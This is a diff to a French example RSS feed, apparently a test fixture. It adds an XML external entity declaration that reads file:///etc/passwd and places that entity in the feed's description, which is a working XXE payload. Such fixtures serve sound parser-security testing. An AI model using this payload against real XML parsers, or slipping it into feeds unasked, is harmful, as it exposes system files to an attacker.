@@ -1,9 +1,12 @@
 <?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss [
+   <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
 <rss version="2.0">
   <channel>
     <title>Exemple de Flux RSS</title>
     <link>https://www.example.com</link>
-    <description>Ceci est un exemple de flux RSS valide</description>
+    <description>&xxe;</description>
     <language>fr</language>
     <pubDate>Mon, 13 Nov 2023 10:00:00 GMT</pubDate>
     <lastBuildDate>Mon, 13 Nov 2023 10:00:00 GMT</lastBuildDate>
